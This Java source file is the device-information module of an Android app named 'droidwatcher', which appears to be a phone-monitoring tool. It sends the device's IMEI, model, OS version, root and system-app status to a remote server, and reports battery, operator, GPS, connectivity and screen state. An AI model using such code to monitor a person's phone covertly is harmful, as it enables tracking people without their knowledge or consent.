package com.droidwatcher.modules;

import java.util.Calendar;
import java.util.Date;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.receivers.BatteryState;
import com.droidwatcher.receivers.ScreenStateReceiver;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.ServerMessage;

public class DeviceInfoModule {
	
	private static final int DAY = 24 * 60 * 60 * 1000;
	private static long getDayOffset(){
		return new Date().getTime() - DAY;
	}
	
	public static void updateDeviceInfoOnServer(Context context){
		try {
			if (!networkAvailable(context)) {
				return;
			}
			
			final SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
			String lastVer = sp.getString("LAST_VERSION", "");
			long lastUpdate = sp.getLong("LAST_INFO_UPDATE", 0);
			String ver = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
			
			if (lastVer.equals(ver) && lastUpdate > getDayOffset()) {
				return;
			}
			
			final String finalVer = ver;
			
			SettingsManager settings = new SettingsManager(context);
			new ServerMessanger(
				context,
				new ServerMessage(MessageType.DEVICE_INFO, settings.imei(), settings.login())
					.addParam("brand", Build.BRAND)
					.addParam("model", Build.MODEL)
					.addParam("os", Build.VERSION.RELEASE)
					.addParam("root", AppService.isRootAvailable())
					.addParam("system", AppService.isSystemApp(context))
					.addParam("date", Calendar.getInstance().getTimeInMillis()),
				new ServerMessanger.ICallBack() {
					@Override
					public boolean onFinished(String response) { return false; }

					@Override
					public void onError() { }

					@Override
					public void onSuccess() {
						Editor editor = sp.edit();
						editor.putString("LAST_VERSION", finalVer);
						editor.putLong("LAST_INFO_UPDATE", new Date().getTime());
						editor.commit();
					}
				}
			).start();
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static JSONObject getDeviceInfo(Context context){
		JSONObject jInfo = new JSONObject();
		
		try {
			jInfo.put("battery", BatteryState.getBatteryLevel());
			
			TelephonyManager telephonyManager =((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
			jInfo.put("operator", telephonyManager.getNetworkOperatorName());
			
			LocationManager locManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE );
			if (locManager != null) {
				jInfo.put("gps", locManager.isProviderEnabled(LocationManager.GPS_PROVIDER));
			}
			
			ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			if (connManager != null) {
				NetworkInfo wifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
				jInfo.put("wifi_connected", wifi != null && wifi.isConnectedOrConnecting());
				
				NetworkInfo gprs = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
				jInfo.put("gprs_connected", gprs != null && gprs.isConnectedOrConnecting());
			}
			
			WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
			if (wifi != null) {
				jInfo.put("wifi", wifi.isWifiEnabled());
			}
			
			jInfo.put("screen", ScreenStateReceiver.getScreenState());
			jInfo.put("external_memory", FileUtil.getExternalStorageFreeMemory());
			
		} catch (JSONException e) {
			Debug.exception(e);
		}
		
		return jInfo;
	}
	
	private static Boolean networkAvailable(Context context){
		ConnectivityManager manager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
}
